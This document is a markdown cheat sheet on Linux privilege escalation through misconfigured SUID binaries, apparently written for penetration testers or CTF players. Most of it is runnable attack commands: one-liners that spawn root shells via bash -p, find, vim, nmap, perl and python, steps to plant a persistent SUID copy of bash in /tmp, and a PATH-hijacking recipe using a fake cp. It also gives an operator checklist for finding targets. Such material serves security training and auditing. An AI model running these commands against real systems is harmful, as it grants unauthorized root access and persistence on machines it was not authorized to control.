
# SUID Binaries  

SUID binaries run with the privileges of their owner (often **root**).  
If a SUID binary is misconfigured → instant privilege escalation.

---

## 🔎 Quick Reference — “Which SUID Binaries Matter Most?”

| Binary / Pattern | Why It Matters | Escalation Vector |
|------------------|----------------|--------------------|
| **/bin/bash**    | Has `-p` flag to preserve privileges | `bash -p` |
| **find**         | Executes arbitrary commands | `find . -exec /bin/sh -p \;` |
| **vim / nano**   | Opens shell via command mode | `:!/bin/bash` |
| **nmap**         | Has interactive shell | `--interactive` → `!sh` |
| **perl / python**| Can call system() as root | GTFOBins |
| **cp / overwrite** | Replace system files | Copy your own SUID shell |
| **custom SUID binaries** | Usually poorly coded | Input injection / path hijack |

These are the first binaries to test against GTFOBins.

---

## 1. Find All SUID Binaries

```bash
find / -perm -4000 -type f 2>/dev/null
````

Prioritize unusual paths:

* `/usr/local/bin/*`
* `/home/*`
* custom names (backup, monitor, helper, checker)
* anything not normally SUID
  (good sign it’s exploitable)

---

## 2. Direct Escalation via GTFOBins

### **bash**

```bash
bash -p
```

---

### **find**

```bash
find . -exec /bin/sh -p \; -quit
```

---

### **vim**

```bash
sudo vim -c ':!/bin/bash'
# or if SUID:
vim -c ':set shell=/bin/bash' -c ':shell'
```

---

### **nmap**

```bash
nmap --interactive
!sh
```

---

### **perl**

```bash
perl -e 'exec "/bin/bash";'
```

---

### **python**

```bash
python3 -c 'import os; os.system("/bin/bash")'
```

---

## 3. Creating Your Own SUID Shell (if allowed)

If you find writable directories or custom scripts invoked by root:

```bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
/tmp/rootbash -p
```

Result → root shell.

---

## 4. Version-Based Exploit (Custom SUID)

If the SUID binary is not standard:

```bash
strings /path/to/binary
ldd /path/to/binary
file /path/to/binary
```

Look for:

* uncontrolled input
* fopen() / fread() on user-provided files
* execve() calls
* relative paths (`cp file1 file2`)

If binary runs as root + weak logic → exploit.

Use:

```bash
strace /path/to/suidbinary
```

Identify where user-controlled input interacts with privileged operations.

---

## 5. PATH Hijacking With SUID Binaries

If the SUID binary calls another binary without an absolute path:

Example inside SUID code:

```
system("cp file1 file2");
```

You can hijack:

```bash
echo "/bin/bash -p" > cp
chmod +x cp
export PATH=.:$PATH
/path/to/suidbinary
```

This runs **your fake cp** as root.

---

## 6. Dangerous SUID Binaries in the Wild

Keep an eye out for:

* `pkexec` (old versions)
* `exim`
* `screen`
* `nano` (older versions)
* `apache` helpers
* anything in `/usr/local/bin`

These historically had local root bugs.

---

## 7. Operator Checklist

* [ ] Run SUID scan
* [ ] Compare binaries against GTFOBins
* [ ] Identify unusual or custom binaries
* [ ] Check for PATH hijacking opportunities
* [ ] Check versions for known CVEs
* [ ] Use `strace` for custom binaries
* [ ] Clean up temporary shells if needed

---

**“Root if misused.” Treat every SUID binary like a loaded weapon.**


